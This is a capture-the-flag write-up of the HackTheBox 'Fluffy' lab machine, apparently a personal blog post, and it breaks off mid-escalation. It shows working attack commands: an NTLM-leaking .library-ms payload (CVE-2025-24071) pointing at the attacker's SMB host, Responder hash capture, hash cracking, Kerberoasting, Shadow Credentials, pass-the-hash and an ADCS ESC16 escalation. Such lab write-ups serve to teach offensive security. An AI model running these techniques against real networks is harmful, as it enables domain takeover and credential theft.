---
title: "HTB - Fluffy Writeup"
date: 2026-10-24 10:00:00 +0700
categories: [HackTheBox, Machines]
tags: [windows, easy]
---

## P0
First of all, I use **rustscan** to find out all opened ports:
```
└─$ rustscan -a 10.129.232.88 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.232.88:53
Open 10.129.232.88:88
Open 10.129.232.88:139
Open 10.129.232.88:389
Open 10.129.232.88:445
Open 10.129.232.88:464
Open 10.129.232.88:593
Open 10.129.232.88:636
Open 10.129.232.88:3268
Open 10.129.232.88:3269
Open 10.129.232.88:5985
Open 10.129.232.88:9389
Open 10.129.232.88:49667
Open 10.129.232.88:49673
Open 10.129.232.88:49674
Open 10.129.232.88:49682
Open 10.129.232.88:49697
Open 10.129.232.88:49703
10.129.232.88 -> [53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49682,49697,49703]
```
Then I use **nmap** for getting details about them:
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49682,49697,49703 -oN 10.129.232.88_nmap 10.129.232.88
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 08:13 -0400
Nmap scan report for 10.129.232.88 (10.129.232.88)
Host is up (0.091s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-24 19:12:10Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-10-24T19:13:45+00:00; +6h58m47s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T19:13:44+00:00; +6h58m46s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T19:13:45+00:00; +6h58m47s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T19:13:44+00:00; +6h58m46s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-24T19:13:06
|_  start_date: N/A
|_clock-skew: mean: 6h58m46s, deviation: 0s, median: 6h58m45s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   100.73 ms 10.10.14.1 (10.10.14.1)
2   100.77 ms 10.129.232.88 (10.129.232.88)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.67 seconds
```

## P1
With each port we find above, I try to enumerate and exploit but nothing is interesting.
It takes me amount of time to realize that: The Fluffy box itself provides us credential for the following account: **j.fleischman | J0elTHEM4n1990!** :)

## P2 & A1
Okey now we will try that credential in anywhere which require authentication. First of all, try with **SMB service**. I usually use **nxc** tool (or **crackmapexec**) to check whether a credential works on a service.
```
└─$ nxc smb 10.129.62.147 -u j.fleischman -p J0elTHEM4n1990!  
SMB         10.129.62.147   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.147   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
```
Good, next I use **smbclient** to directly interact with SMB server:<br>
```
└─$ nxc smb 10.129.62.147 -u j.fleischman -p J0elTHEM4n1990! --shares
SMB         10.129.62.147   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.62.147   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
SMB         10.129.62.147   445    DC01             [*] Enumerated shares
SMB         10.129.62.147   445    DC01             Share           Permissions     Remark
SMB         10.129.62.147   445    DC01             -----           -----------     ------
SMB         10.129.62.147   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.62.147   445    DC01             C$                              Default share
SMB         10.129.62.147   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.62.147   445    DC01             IT              READ,WRITE      
SMB         10.129.62.147   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.62.147   445    DC01             SYSVOL          READ            Logon server share 
```
**IT** looks like a customized share which the current user **j.fleischman** has both **READ,WRITE** permissions.
```
└─$ smbclient //10.129.62.147/IT --user j.fleischman
Password for [WORKGROUP\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct 25 03:38:47 2026
  ..                                  D        0  Sun Oct 25 03:38:47 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

                5842943 blocks of size 4096. 1784820 blocks available
smb: \> get Upgrade_Notice.pdf 
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (457.2 KiloBytes/sec) (average 457.2 KiloBytes/sec)
```
In here, I find an interesting pdf file name **Upgrade_notice.pdf**. This file looks like a report about new CVEs which need to be patched on the system target. I try searching information about both two critical CVEs on Google and find a PoC for **CVE-2025-24071**<br>

![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_07-43.png){: w="700" }

Before deep dive in it, we need to understand how it works first:<br>

*This CVE means we create a **.library-ms** file. This file has XML format and it has a tag name **simpleLocation**. We can define an SMB url (for example) as a value for that tag. Then we create a zip archive containing the **.library-ms** file we have just created above and find a way to put it on the target. If someone on target extract the zip file, the Windows Explorer automatically parses the content of **.library-ms**. It find that "Oh SMB url, call it right now" and call directly to SMB url and attach the NTMLv2 hash to the attacker's url.*

```
└─$ cat payload.library-ms 
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.15.107</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```
We can find out public POC on github:
```
└─$ python3 exploit.py -i 10.10.15.107 -f payload.library-ms 

          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __                                                                          
         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |                                                                         
        |  ,----' \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |                                                                         
        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |                                                                         
        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |                                                                         
         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|                                                                         
                                                                                                                                                                                             
                                                                                                                                                                                             
                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)                                                                                
                    by ThemeHackers                                                                                                                                                                                                                                                                                                                                                       
                                                                                                                                                                                             
Creating exploit with filename: payload.library-ms.library-ms
Target IP: 10.10.15.107

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```
On my kali linux, I turn on **responder** to capture NTLMv2 hash:
```
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.107]
    Responder IPv6             [fe80::cdf0:247:96ae:495c]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-CD6YGPTSD1C]
    Responder Domain Name      [UCVT.LOCAL]
    Responder DCE-RPC Port     [45039]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...
```
OKey, now we need to put the **exploit.zip** file to the target. Here, I choose SMB service as the way to achive it.
```
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (1.4 kB/s) (average 1.4 kB/s)
```
After server extract the zip file, our **responder** receive the NTLMv2 hash from the target:
```
[SMB] NTLMv2-SSP Client   : 10.129.62.147
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:12e3f439bacedde3:BB6077DBEB4F5B8CFAB0A4EB8FD45809:010100000000000000138BF3F863DD010C7E4116052F0DCC0000000002000800550043005600540001001E00570049004E002D004300440036005900470050005400530044003100430004003400570049004E002D00430044003600590047005000540053004400310043002E0055004300560054002E004C004F00430041004C000300140055004300560054002E004C004F00430041004C000500140055004300560054002E004C004F00430041004C000700080000138BF3F863DD0106000400020000000800300030000000000000000100000000200000A44FE4F7F9C7D6982ED420FC6AF9A1B480DB8FA874F9361CE88D01233A83B2A70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100300037000000000000000000
```
It's time for using hashcat and very interesting, I find a new credential: **p.agila:prometheusx-303**<br>
```
└─$ .\hashcat.exe -a 0 -m 5600 'p.agila::FLUFFY:12e3f439bacedde3:BB6077DBEB4F5B8CFAB0A4EB8FD45809:010100000000000000138BF3F863DD010C7E4116052F0DCC0000000002000800550043005600540001001E00570049004E002D004300440036005900470050005400530044003100430004003400570049004E002D00430044003600590047005000540053004400310043002E0055004300560054002E004C004F00430041004C000300140055004300560054002E004C004F00430041004C000500140055004300560054002E004C004F00430041004C000700080000138BF3F863DD0106000400020000000800300030000000000000000100000000200000A44FE4F7F9C7D6982ED420FC6AF9A1B480DB8FA874F9361CE88D01233A83B2A70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100300037000000000000000000' ..\own-wordlist\rockyou.txt
P.AGILA::FLUFFY:12e3f439bacedde3:bb6077dbeb4f5b8cfab0a4eb8fd45809:010100000000000000138bf3f863dd010c7e4116052f0dcc0000000002000800550043005600540001001e00570049004e002d004300440036005900470050005400530044003100430004003400570049004e002d00430044003600590047005000540053004400310043002e0055004300560054002e004c004f00430041004c000300140055004300560054002e004c004f00430041004c000500140055004300560054002e004c004f00430041004c000700080000138bf3f863dd0106000400020000000800300030000000000000000100000000200000a44fe4f7f9c7d6982ed420fc6af9a1b480db8fa874f9361ce88d01233a83b2a70a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100300037000000000000000000:prometheusx-303
```
Normally, when doing lab on HTB or redteaming in the real life, if I reach a domain sign (port 88/389/636/445 or hostname DC, here is **fluffy.htb**) I will immediately enumerate AD. Because Fluffy machine has give us a credential, so I will directly use it for bloodhound rather than enumerate from the scratch:
```
└─$ bloodhound-python -ns 10.129.62.147 -d fluffy.htb -u j.fleischman -p J0elTHEM4n1990! -c ALL --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::1e30:473b:18bb:50ee
INFO: Trying LDAP connection to dead:beef::1e30:473b:18bb:50ee
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::1e30:473b:18bb:50ee
INFO: Trying LDAP connection to dead:beef::1e30:473b:18bb:50ee
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20261024214503_bloodhound.zip
```
Good, import all of them to **bloodhound GUI** and start researching the internal target !!!<br>

![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-06.png){: w="700" }

First of all, we can see that user **J.FLEISCHMAN@FLUFFY.HTB** is not member of any special groups and it also does not have any **Outbound Object Control**. So we will ignore it and continue with another. Luckily, from SMB service we have found a new credential **p.agila:prometheusx-303**:<br>

![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-07.png){: w="700" }

![Upgrade_Notice.pdf](assets/image/htb/fluffy/2026-10-25_09-08.png){: w="700" }

So from the bloodhound GUI, we can see that **p.agila** is the member of **Service Account Managers**. This group has **GenericAll** permission on group **Service Accounts** - which has **GenericWrite** on 3 users **ca_svc, winrm_svc and ldap_svc**. So if we add **p.agila** to **Service Accounts** (abuse **GenericAll**), it will have **GenericWrite** on three of svc accounts.<br>
In addition to, **ca_svc** is marked as **Tire Zero** in bloodhound so I belive that if we can escalate on it, we will make our attack surface larger !!<br>
Three of users which are members of **Service Accounts** have SPN, so I try kerberoasting first:
```
└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
--------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
*The error KRB_AP_ERR_SKEW(Clock skew too great) occurs because the time difference between our attacking machine and the target domain controller (DC) exceeds 5 minutes (300 seconds). Kerberos strictly requires the client and server clocks to be synchronized to prevent replay attacks*
```
└─$ sudo timedatectl set-ntp off
└─$ sudo rdate -n 10.129.62.147
```
Both above commands will help us synchronize the clocks between our machine and the DC target.<br>
Now try again with kerberoast by using **impacket-GetuserSPNs**:
```
└─$ impacket-GetUserSPNs -dc-ip 10.129.62.147 fluffy.htb/P.AGILA:prometheusx-303 -request-user ca_svc
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name    MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
--------------------  ------  ---------------------------------------------  --------------------------  --------------------------  ----------
ADCS/ca.fluffy.htb    ca_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-05-21 18:21:15.969274             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$fc1ead87a213b0da1b7bc9aca9b636ac$3f656088cc1fd78d7b1cb431e6740c47f92e712889d3f316d7c55a262f10c10a14507036d581609c897aac0ccc0ba51d49274bfdf05c3f14e26ca49028d23ad5694a9f02dbc670ae4405c11be657c726e72ac1f3d3dc09f0e44685270cd7df1515cffcd418e8c41ff1db1ab5ee85b48ab0900891d914cfa411faf27300aafef2ec7eeae299697fc456d02c5f11cfc95b9003bcbea275dca542350936dea317ceed5ed7f8d0a3d7e676121a6edaaabc292f4154ba10014c1193377fdcb95ad22a373fb907db9acc28c20888576d0631024e6ee5315ce8bacaec8fba81411d7935c9a43eb9bb924542c3cb5f125f229a4bc996e8ac0e420a8f425225dac98c2de266a73e600805bbaf08fd7aba41c83a587de10cdf17b1e2b073c602971cdda350e756a67787700ac0f1b9f322bdda83fa63752aa225ba49c93d97f84e1cb8f5c91a3a76d1399a95602a1a3761edf861ed1604f415679f9f1808c4b0869a088349b921aecc1c67eb8bb008a2660c40cd6beae70dd886b1ae513d3914413f7e47edfd2c56aa9d7c0898816d3d9b9812bd06ee9c6ae11f380cae216cd1cb0ebd7bd0596f227b588bf818c9796fba7d931658e2567335af4a7baedc984f8911dfc686e3f188df85af601a899e810769022a504c3cc5ae85c815a99f8223f7bb03c6f13dd4db2f223a30fb586badcf59b3b45f2eea701e24dab0d85d57566c19942b5a5b07163f3b44d664fcb424fe936e37458899cbacc584c52d6546595ce032ede343ad5dca65f3d5f248e4313de74e295934ed79d62343c7951e3f10e14cb863ca59606d37a11b70506aa7ad7885e1676389043d26c1b780fe74b211350ced66b86f00636c3641a46be2b8c98a5b2f5a8d86f9107dde42b795b764a2f4e35ba331bdb82f99ec0cd37f0ad5d8311578379b0f2166291f1484f81dca3ef6ad09e741378ce91ec18cdae7f6d2d6e41055764bd9b26c9600e5da31072f8c19056988219426b310f1726ce06b172d8bec2eea17f3ce58ddfe763b291b977eaa675a952c20ae0a6837829c730af7bfdc8e57e931adb48574b8b740159b093260e6a1f97ad1f4ef3c28fbdb14f832a3c4a1297cc783dbd5dcc9472827a1eb29c3ef7e05dbf5b31495eb79441b533da9a615f9ab9b1b525b2ad36ada01076a4071f4c0261d2932deedf964e8a2f72baad3ccbd696b34fc627fed289c70e36c1a884356dac3857ce447cc6f6bd3fc485781afdc6ab4e646b8f4df3eda1f284211ea19738458c0bacff23be757722d8a9f0c9d47cca85119b4239936e47466fd8f637aecc69656a30b533f6cc29f2a14679ff4b88b89ba8ffec36a8b51b88c0d11c934228071ec4e3659d319e10c4c727cdec0469e08cee4579024253c29ca79e1403f036ab58a3d7828a5529d5ac92de00a65588a002fafb476d77e3299205c87e85e71416406462b9fdaddec16ce0ef601c94977d57632973b74642489e70d4c7e549184764148
```
Good, now try hashcat with hope that we can findout the password of user **ca_svc** but....nothing happens :(<br>

We need to change our thinking to other methods. I try to search on Google to find anything related to **GenericWrite** abuse and fortunately: **Shadow Credentials** saves my life. Anyway, we need to understand what is Shadow Credentials attack and how it works behind the scence.<br>

First, we need to talk about **PKINIT**: <br>
*PKINIT (Public Key Cryptography for Initial Authentication) is an extension to the Kerberos protocol. The traditional Kerberos initial authentication relies on a password-derived key, while PKINIT allows the use of public key cryptography (such as smart cards or certificates) to complete the initial authentication and obtain a Ticket Granting Ticket (TGT).*<br>
**It means, normally when authenticating with Kerberos we must use either NTLM hash or scret key but now, with the help of PKINIT, we can use a public key cryptography to achive the similar purpose.**

*This is how PKINIT works behind the scence:*
- The client possesses a private key (usually stored in a TPM or smart card) and sends an authentication request signed with the private key to the domain controller (KDC).
- The KDC looks up the corresponding public key in the **msDS-KeyCredentialLink** attribute of the account.
- The KDC verifies the signature using the public key, and if successful, issues a TGT

**Relies on above flow, we find one weak point here "*The KDC looks up the corresponding public key in the msDS-KeyCredentialLink attribute of the account*". If we can insert our fake public key to **msDS-KeyCredentialLink** attribute of account target, yes of course, we can authenticate as the account target.**

As we discuss above, firstly we will add **p.agila** to group **Service Accounts**:
```
└─$ bloodyAD -d fluffy.htb -u p.agila -p prometheusx-303 --host 10.129.62.147 add groupMember "service accounts" "p.agila"
[+] p.agila added to service accounts
```
Then, by using **certipy** we can insert our public key to **msDS-KeyCredentialLink** attribute of **winrm_svc** (through **GenericWrite**):
```
└─$ certipy shadow -account winrm_svc -dc-ip 10.129.62.147 -u p.agila -p prometheusx-303 add                              
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a99be39e5e8347eb83b98675ff5d0d23'
[*] Adding Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'a99be39e5e8347eb83b98675ff5d0d23' to the Key Credentials for 'winrm_svc'
[*] Saving certificate and private key to 'winrm_svc.pfx'
[*] Saved certificate and private key to 'winrm_svc.pfx'
```
Next authenticate as user **winrm_svc**:
```
└─$ certipy auth -pfx winrm_svc.pfx -username winrm_svc -domain fluffy.htb -dc-ip 10.129.62.147
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
```
Wait a minute, I want to explain a little bit why we can achive hash for **winrm_svc@fluffy.htb**, where is it from :D<br>
*When a user authenticates via PKINIT (certificate-based logon), Microsoft's implementation embeds the user's NT hash inside the PAC of the issued ticket, encrypted with the session key from the AS exchange. This exists purely for compatibility: it lets a certificate-authenticated user seamlessly fall back to NTLM-only services without re-entering a password. But the DC makes no distinction between the legitimate user and an attacker holding the certificate — so Certipy simply requests a service ticket for the account itself, decrypts the PAC with the session key it already holds, and pulls out the hash. This is the **unPAC the Hash** technique: abusing a legitimate convenience feature to turn a certificate into an NT hash, no cracking required.*<br>

 Now using **ptH** technique to get a shell from **winrm_svc** and read the user flag:
```
└─$ evil-winrm -i 10.129.62.147 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

```
Evil-WinRM* PS C:\users\winrm_svc\Desktop> type user.txt
```
## P3 & A1
Similarly, we can easily findout the NLTM hash of **ca_svc**. Then we need to basic enumerate for ADCS:
```
└─$ certipy find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```
**ESC16** - interesting finding !!<br>
*ESC16 is a privilege escalation misconfiguration in Active Directory Certificate Services (AD CS) where the Certificate Authority (CA) has disabled the SID security extension for all certificates it issues, not just those from a specific template . This occurs when the OID 1.3.6.1.4.1.311.25.2 is added to the CA's DisableExtensionList, causing issued certificates to lack the SID mapping that domain controllers rely on for secure authentication . As a result, if the domain's strong certificate binding enforcement is not set to the strictest level, an attacker who can manipulate a user account's UPN can request a certificate and authenticate as another principal, effectively escalating privileges across the domain.*

Okey, firstly change UPN (User principle name) of ca_svc to **administrator@fluffy.htb**:
```
└─$ certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -user ca_svc -upn administrator@fluffy.htb update
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator@fluffy.htb
[*] Successfully updated 'ca_svc'
```
Next request a certificate by using user **ca_svc** (now its UPN is **administrator@fluffy.htb**)
```
└─$ certipy req -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@fluffy.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```
Before we authenticate with **administrator.pfx**, we need to rechange the UPN of **ca_svc** again. Why ?<br>
*Before authenticating with administrator.pfx, we must restore ca_svc's UPN back to ca_svc@fluffy.htb because the certificate's SAN contains the UPN administrator@fluffy.htb, and during PKINIT the KDC resolves that UPN to an account in AD. Since you previously changed ca_svc's UPN to administrator@fluffy.htb to obtain the certificate, AD currently holds two accounts with that same UPN — the real Administrator and the spoofed ca_svc*
```
└─$ certipy account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.62.147 -user ca_svc -upn ca_svc@fluffy.htb update
